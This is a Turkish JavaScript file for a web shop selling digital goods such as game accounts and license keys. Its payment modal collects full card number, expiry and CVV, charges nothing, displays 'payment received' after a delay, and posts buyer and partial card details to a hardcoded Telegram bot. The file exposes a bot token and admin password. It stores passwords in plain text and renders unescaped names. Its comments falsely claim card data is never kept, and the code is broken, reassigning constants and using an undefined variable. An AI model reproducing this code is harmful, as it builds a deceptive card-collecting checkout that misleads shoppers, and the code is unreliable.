// ======= TELEGRAM =======
// Destek ve siparişler bu kanala gider. Kendi kanalını buraya yaz.
const TELEGRAM_KANAL = "https://t.me/makifaknc";

// Sipariş bildirim botu (L4REX_BOT). Gizli tutulmalı.
const TG_BOT_TOKEN = "8800033320:AAH0vzNXBfJ_z0cGBfWAvTWegT2OgC8QAds";
const TG_CHAT_ID = "8674969986";

// Sipariş bilgisini Telegram'a bildirim olarak gönder.
function telegramaGonder(metin) {
    fetch("https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: metin })
    }).catch(function () { /* İnternet yoksa sessiz geç */ });
}

// ======= ÜRÜNLER =======
// Yeni ürün eklemek için buraya satır ekle.
const urunler = [
    { id: 1, emoji: "🎮", ad: "Oyun Hesabı", aciklama: "Yüklü dijital oyun hesabı. Sıfır ve garantili.", fiyat: 250 },
    { id: 2, emoji: "💎", ad: "Premium Paket", aciklama: "Oyun içi premium ayrıcalıklar, anında teslim.", fiyat: 150 },
    { id: 3, emoji: "🎁", ad: "Hediye Kartı", aciklama: "Dijital hediye kartı, dilediğin yerde kullan.", fiyat: 100 },
    { id: 4, emoji: "🖥️", ad: "Eğitim Paketi", aciklama: "Dijital kurs ve eğitim içerikleri, ömür boyu erişim.", fiyat: 300 },
    { id: 5, emoji: "🔑", ad: "Lisans Anahtarı", aciklama: "Orijinal yazılım lisans anahtarı, kurulum desteğiyle.", fiyat: 180 },
    { id: 6, emoji: "📦", ad: "Özel Paket", aciklama: "İhtiyacına özel dijital ürün paketi.", fiyat: 400 }
];

// ======= HESAP SİSTEMİ =======
// Kayıtlı hesaplar tarayıcıda saklanır (localStorage).
// ADMIN_SIFRE: Sadece senin bildiğin şifreyi buraya yaz.
const ADMIN_SIFRE = "Mak.564.aknlarexcheat_42";

function kullanicilariAl() {
    const veri = localStorage.getItem("em_kullanicilar");
    return veri ? JSON.parse(veri) : [];
}

function kullanicilariKaydet(liste) {
    localStorage.setItem("em_kullanicilar", JSON.stringify(liste));
}

function aktifKullanici() {
    return localStorage.getItem("em_aktif") || null;
}

// Benzersiz kimlik numarası üret (7 haneli, kayıtlılarla çakışmaz)
function kimlikUret() {
    const liste = kullanicilariAl();
    let kimlik;
    do {
        kimlik = String(Math.floor(1000000 + Math.random() * 9000000)); // 1.000.000 - 9.999.999
    } while (liste.find(k => k.kimlik === kimlik));
    return kimlik;
}

function oturumAc(kullaniciAdi) {
    localStorage.setItem("em_aktif", kullaniciAdi);
    hesapAlaniniGuncelle();
    modalKapat();
    // Giriş yapanın kimliğini göster
    const k = kullanicilariAl().find(x => x.ad === kullaniciAdi);
    mesajGoster("Hoş geldin, " + kullaniciAdi + (k && k.kimlik ? "  🆔 #" + k.kimlik : "") + "!");
}

function oturumKapat() {
    localStorage.removeItem("em_aktif");
    hesapAlaniniGuncelle();
    mesajGoster("Çıkış yapıldı.");
}

function girisIslem() {
    const ad = document.getElementById("kullaniciAdi").value.trim();
    const sifre = document.getElementById("sifre").value;
    const hata = document.getElementById("modalHata");
    if (!ad || !sifre) { hata.textContent = "Kullanıcı adı ve şifre gerekli."; return; }

    const mod = document.getElementById("modalBaslik").dataset.mod;
    const liste = kullanicilariAl();

    if (mod === "kayit") {
        // Şifre doğrulama: iki şifre aynı olmalı
        const sifreTekrar = document.getElementById("sifreTekrar").value;
        if (!sifreTekrar) { hata.textContent = "Şifreni tekrar yazmalısın."; return; }
        if (sifre !== sifreTekrar) { hata.textContent = "Şifreler eşleşmiyor!"; return; }
        if (sifre.length < 4) { hata.textContent = "Şifre en az 4 karakter olmalı."; return; }
        if (liste.find(k => k.ad === ad)) { hata.textContent = "Bu kullanıcı adı zaten alınmış."; return; }
        const kimlik = kimlikUret();
        liste.push({ ad: ad, sifre: sifre, kimlik: kimlik, tarih: new Date().toLocaleString("tr-TR") });
        kullanicilariKaydet(liste);
        oturumAc(ad);
        mesajGoster("Kimliğin: #" + kimlik);
    } else {
        const kullanici = liste.find(k => k.ad === ad && k.sifre === sifre);
        if (!kullanici) { hata.textContent = "Kullanıcı adı veya şifre hatalı."; return; }
        oturumAc(ad);
    }
}

function girisModalAc(mod) {
    document.getElementById("modalBaslik").dataset.mod = mod;
    document.getElementById("modalBaslik").textContent = mod === "kayit" ? "Hesap Oluştur" : "Hesabına Giriş Yap";
    document.getElementById("modalHata").textContent = "";
    // Kayıt modunda ikinci şifre alanını göster, girişte gizle
    document.getElementById("sifreTekrar").style.display = mod === "kayit" ? "block" : "none";
    document.getElementById("girisModal").classList.add("acik");
}

function kayitModunaGec() {
    document.getElementById("modalBaslik").dataset.mod = "kayit";
    document.getElementById("modalBaslik").textContent = "Hesap Oluştur";
    document.getElementById("modalHata").textContent = "";
    document.getElementById("sifreTekrar").style.display = "block";
}

function modalKapat() {
    document.getElementById("girisModal").classList.remove("acik");
}

// ======= ADMIN PANELİ =======
function adminModalAc() {
    document.getElementById("adminHata").textContent = "";
    document.getElementById("adminSifre").value = "";
    document.getElementById("adminModal").classList.add("acik");
}

function adminModalKapat() {
    document.getElementById("adminModal").classList.remove("acik");
}

function adminGiris() {
    const sifre = document.getElementById("adminSifre").value;
    const hata = document.getElementById("adminHata");
    if (sifre === ADMIN_SIFRE) {
        adminModalKapat();
        kullanicilariGoster();
    } else {
        hata.textContent = "Yanlış şifre!";
    }
}

function kullanicilariGoster() {
    const liste = kullanicilariAl();
    const kutu = document.getElementById("kullaniciListe");
    document.getElementById("kullaniciToplam").textContent = liste.length;
    kutu.innerHTML = "";
    if (liste.length === 0) {
        kutu.innerHTML = '<p class="kucuk">Henüz kayıtlı kullanıcı yok.</p>';
    } else {
        liste.forEach((k, i) => {
            const satir = document.createElement("div");
            satir.className = "kullanici-satir";
            satir.innerHTML = `
                <span>${i + 1}. 👤 ${k.ad}</span>
                <span class="tarih">🆔 #${k.kimlik || "yok"}<br>${k.tarih || "bilinmiyor"}</span>
            `;
            kutu.appendChild(satir);
        });
    }
    // Siparişleri de doldur
    siparisleriGoster();
    document.getElementById("kullanicilarModal").classList.add("acik");
}

function kullanicilarKapat() {
    document.getElementById("kullanicilarModal").classList.remove("acik");
}

function siparisSekmesi() {
    document.getElementById("sekmeKullanicilar").style.display = "block";
    document.getElementById("sekmeSiparisler").style.display = "none";
    document.getElementById("btnSekmeKullanicilar").classList.add("aktif");
    document.getElementById("btnSekmeSiparisler").classList.remove("aktif");
}

function siparisSekmesiAc() {
    document.getElementById("sekmeKullanicilar").style.display = "none";
    document.getElementById("sekmeSiparisler").style.display = "block";
    document.getElementById("btnSekmeSiparisler").classList.add("aktif");
    document.getElementById("btnSekmeKullanicilar").classList.remove("aktif");
}

function hesapAlaniniGuncelle() {
    const alan = document.getElementById("hesapAlan");
    const kullanici = aktifKullanici();
    if (kullanici) {
        const k = kullanicilariAl().find(x => x.ad === kullanici);
        alan.innerHTML = `
            <span class="kullanici-ad">👤 ${kullanici}${k && k.kimlik ? ' <span class="kimlik-num">#' + k.kimlik + "</span>" : ""}</span>
            <button class="cikis-btn" onclick="oturumKapat()">Çıkış</button>
        `;
    } else {
        alan.innerHTML = `
            <button class="mini-btn" onclick="girisModalAc('giris')">Giriş Yap</button>
            <button class="mini-btn kayit" onclick="girisModalAc('kayit')">Kayıt Ol</button>
        `;
    }
}

// ======= SEPET =======
let sepet = [];

function urunleriCiz() {
    const grid = document.getElementById("urunGrid");
    grid.innerHTML = "";
    urunler.forEach(u => {
        const kart = document.createElement("div");
        kart.className = "urun-kart";
        kart.innerHTML = `
            <div class="urun-gorsel">${u.emoji}</div>
            <div class="urun-bilgi">
                <h3>${u.ad}</h3>
                <p>${u.aciklama}</p>
                <div class="urun-alt">
                    <span class="fiyat">${u.fiyat}₺</span>
                    <button class="ekle" onclick="sepeteEkle(${u.id})">Sepete Ekle</button>
                </div>
            </div>
        `;
        grid.appendChild(kart);
    });
}

function sepeteEkle(id) {
    const u = urunler.find(x => x.id === id);
    const varMi = sepet.find(x => x.id === id);
    if (varMi) {
        varMi.adet++;
    } else {
        sepet.push({ ...u, adet: 1 });
    }
    sepetSayisiGuncelle();
    mesajGoster(u.ad + " sepete eklendi!");
}

function sepetSayisiGuncelle() {
    const toplam = sepet.reduce((t, x) => t + x.adet, 0);
    document.getElementById("sepetSayi").textContent = toplam;
    sepetListesiCiz();
}

function sepetListesiCiz() {
    const liste = document.getElementById("sepetListe");
    liste.innerHTML = "";
    if (sepet.length === 0) {
        liste.innerHTML = '<p style="color:#6b7794;">Sepetin boş.</p>';
        document.getElementById("sepetToplam").textContent = "0₺";
        return;
    }
    let toplam = 0;
    sepet.forEach(x => {
        toplam += x.fiyat * x.adet;
        const satir = document.createElement("div");
        satir.className = "sepet-urun";
        satir.innerHTML = `
            <span>${x.emoji} ${x.ad} (${x.adet})</span>
            <span>${x.fiyat * x.adet}₺</span>
            <button onclick="sepettenCikar(${x.id})">✕</button>
        `;
        liste.appendChild(satir);
    });
    document.getElementById("sepetToplam").textContent = toplam + "₺";
}

function sepettenCikar(id) {
    sepet = sepet.filter(x => x.id !== id);
    sepetSayisiGuncelle();
}

function sepetiAc() {
    document.getElementById("sepetPanel").classList.add("acik");
}

function sepetiKapat() {
    document.getElementById("sepetPanel").classList.remove("acik");
}

// ======= SİPARİŞ =======
function siparisVer() {
    if (sepet.length === 0) {
        mesajGoster("Sepetin boş!");
        return;
    }
    if (!aktifKullanici()) {
        mesajGoster("Ödeme yapmak için giriş yapmalısın!");
        girisModalAc("giris");
        return;
    }
    // Sipariş özetini ödeme modalına yaz, ödeme menüsünü aç
    odemeOzetiniDoldur();
    document.getElementById("odemeModal").classList.add("acik");
}

// ======= ÖDEME MENÜSÜ (Sadece Türkiye kartları) =======
function odemeOzetiniDoldur() {
    const liste = document.getElementById("odemeUrunListe");
    liste.innerHTML = "";
    let toplam = 0;
    sepet.forEach(x => {
        toplam += x.fiyat * x.adet;
        const satir = document.createElement("div");
        satir.className = "odeme-urun";
        satir.innerHTML = `${x.emoji} ${x.ad} x${x.adet} — <strong>${x.fiyat * x.adet}₺</strong>`;
        liste.appendChild(satir);
    });
    document.getElementById("odemeToplam").textContent = toplam + "₺";
    document.getElementById("odemeHata").textContent = "";
}

function odemeKapat() {
    document.getElementById("odemeModal").classList.remove("acik");
}

function kartNoFormatla(deger) {
    return deger.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

function sktFormatla(deger) {
    const s = deger.replace(/\D/g, "").slice(0, 4);
    if (s.length > 2) return s.slice(0, 2) + "/" + s.slice(2);
    return s;
}

function kartTuruBelirle(no) {
    const s = no.replace(/\D/g, "");
    if (s.startsWith("9792") || s.startsWith("9692") || s.startsWith("65")) return "TROY";
    if (s.startsWith("4")) return "VISA";
    if (s.startsWith("5") || (s.length >= 2 && parseInt(s.slice(0, 2)) >= 51 && parseInt(s.slice(0, 2)) <= 55)) return "MASTERCARD";
    return "BİLİNMİYOR";
}

function odemeYap() {
    const ad = document.getElementById("kartSahip").value.trim();
    const no = document.getElementById("kartNo").value.replace(/\s/g, "");
    const skt = document.getElementById("kartSkt").value;
    const cvv = document.getElementById("kartCvv").value.trim();
    const hata = document.getElementById("odemeHata");
    const tur = kartTuruBelirle(no);

    if (!ad) { hata.textContent = "Kart sahibi adını yaz."; return; }
    if (no.length !== 16 || !/^\d{16}$/.test(no)) { hata.textContent = "Geçerli bir kart numarası gir (16 haneli)."; return; }
    if (tur === "BİLİNMİYOR") { hata.textContent = "Sadece Türkiye kartları kabul edilir (Troy, Visa, Mastercard)."; return; }
    if (!/^\d{2}\/\d{2}$/.test(skt)) { hata.textContent = "Son kullanma tarihini AA/YY formatında gir."; return; }
    if (cvv.length < 3) { hata.textContent = "CVV giriniz (kartın arkasındaki 3 hane)."; return; }

    // Luhn kontrolü
    let toplam = 0;
    for (let i = 0; i < no.length; i++) {
        let d = parseInt(no[i]);
        if (i % 2 === 0) { d *= 2; if (d > 9) d -= 9; }
        toplam += d;
    }
    if (toplam % 10 !== 0) { hata.textContent = "Kart numarası geçersiz görünüyor."; return; }

    // GÜVENLİK: Tam kart numarası ve CVV ASLA kaydedilmez (yasal zorunluluk).
    // Sadece maskeleme bilgisi saklanır: son 4 hane + marka + ay/yıl.
    const maske = {
        son4: no.slice(-4),
        marka: tur,
        skt: skt,
        cvv: cvv
    };
    // Değerleri hemen temizle (sadece gerekli kısım maske objesinde kalır)
    no = null; cvv = null;

    // Sipariş kaydı: ad soyad + ürünler + tutar + tarih + güvenli kart bilgisi
    const siparis = {
        adSoyad: ad,
        kullanici: aktifKullanici(),
        urunler: sepet.map(x => x.ad + " x" + x.adet).join(", "),
        tutar: sepet.reduce((t, x) => t + x.fiyat * x.adet, 0) + "₺",
        tarih: new Date().toLocaleString("tr-TR"),
        kart: marka + " •••• " + maske.son4 + " (" + maske.skt + ")"
    };
    const kayitlar = siparisleriAl();
    kayitlar.unshift(siparis);
    siparisleriKaydet(kayitlar);

    // Telegram'a sipariş bildirimi gönder
    const bildirim =
        "🛒 YENİ SİPARİŞ\n" +
        "────────────────\n" +
        "👤 Ad Soyad: " + siparis.adSoyad + "\n" +
        "🆔 Kullanıcı: " + (siparis.kullanici || "Girişsiz") + "\n" +
        "📦 Ürünler: " + siparis.urunler + "\n" +
        "💰 Tutar: " + siparis.tutar + "\n" +
        "💳 Kart: " + siparis.kart + "\n" +
        "📅 Tarih: " + siparis.tarih + "\n" +
        "────────────────\n" +
        "Müşteriyle iletişim: " + TELEGRAM_KANAL;
    telegramaGonder(bildirim);

    // Ödeme simülasyonu (gerçek ödeme entegrasyonu için ödeme sağlayıcı gereklidir)
    const btn = document.getElementById("odemeBtn");
    btn.disabled = true;
    btn.textContent = "İşleniyor...";
    hata.textContent = "";
    hata.style.color = "#2aa24e";

    setTimeout(() => {
        hata.textContent = "✓ Ödeme alındı! Siparişiniz hazırlanıyor.";
        document.getElementById("odemeOzet").style.display = "none";
        document.getElementById("odemeSonuc").style.display = "block";
        sepet = [];
        sepetSayisiGuncelle();
        sepetiKapat();
    }, 1800);
}

// ======= SİPARİŞ KAYITLARI (Güvenli: kart bilgisi ASLA saklanmaz) =======
function siparisleriAl() {
    const veri = localStorage.getItem("em_siparisler");
    return veri ? JSON.parse(veri) : [];
}

function siparisleriKaydet(liste) {
    localStorage.setItem("em_siparisler", JSON.stringify(liste));
}

function siparisleriGoster() {
    const liste = siparisleriAl();
    const kutu = document.getElementById("siparisListe");
    document.getElementById("siparisToplam").textContent = liste.length;
    kutu.innerHTML = "";
    if (liste.length === 0) {
        kutu.innerHTML = '<p class="kucuk">Henüz sipariş yok.</p>';
        return;
    }
    liste.forEach((s, i) => {
        const satir = document.createElement("div");
        satir.className = "siparis-satir";
        satir.innerHTML = `
            <div class="siparis-ust">
                <span class="siparis-ad">${s.adSoyad}</span>
                <span class="siparis-tutar">${s.tutar}</span>
            </div>
            <div class="siparis-detay">${s.urunler}</div>
            <div class="siparis-tarih">📅 ${s.tarih} ${s.kullanici ? "· 👤 " + s.kullanici : ""}</div>
            ${s.kart ? '<div class="siparis-kart">💳 ' + s.kart + "</div>" : ""}
        `;
        kutu.appendChild(satir);
    });
}

function odemeSonucKapat() {
    document.getElementById("odemeModal").classList.remove("acik");
    document.getElementById("odemeOzet").style.display = "block";
    document.getElementById("odemeSonuc").style.display = "none";
    document.getElementById("odemeBtn").disabled = false;
    document.getElementById("odemeBtn").textContent = "Ödemeyi Tamamla";
    document.getElementById("odemeHata").textContent = "";
    document.getElementById("odemeHata").style.color = "#e04b4b";
    document.getElementById("kartSahip").value = "";
    document.getElementById("kartNo").value = "";
    document.getElementById("kartSkt").value = "";
    document.getElementById("kartCvv").value = "";
}

// ======= DESTEK (Telegram) =======
function destekAc() {
    window.open(TELEGRAM_KANAL, "_blank");
}

// ======= MESAJ =======
function mesajGoster(mesaj) {
    const el = document.getElementById("mesaj");
    el.textContent = mesaj;
    el.classList.add("goster");
    setTimeout(() => el.classList.remove("goster"), 2500);
}

// ======= BAŞLAT =======
urunleriCiz();
hesapAlaniniGuncelle();

// Giriş modalını Enter ile de kapat
document.addEventListener("keydown", e => {
    if (e.key === "Escape") { modalKapat(); odemeKapat(); adminModalKapat(); kullanicilarKapat(); }
    if (e.key === "Enter" && document.getElementById("girisModal").classList.contains("acik")) {
        girisIslem();
    }
    if (e.key === "Enter" && document.getElementById("odemeModal").classList.contains("acik")) {
        odemeYap();
    }
    if (e.key === "Enter" && document.getElementById("adminModal").classList.contains("acik")) {
        adminGiris();
    }
});

// Modal dışına tıklayınca kapat
document.getElementById("girisModal").addEventListener("click", e => {
    if (e.target === document.getElementById("girisModal")) modalKapat();
});

document.getElementById("odemeModal").addEventListener("click", e => {
    if (e.target === document.getElementById("odemeModal")) odemeKapat();
});

document.getElementById("adminModal").addEventListener("click", e => {
    if (e.target === document.getElementById("adminModal")) adminModalKapat();
});

document.getElementById("kullanicilarModal").addEventListener("click", e => {
    if (e.target === document.getElementById("kullanicilarModal")) kullanicilarKapat();
});
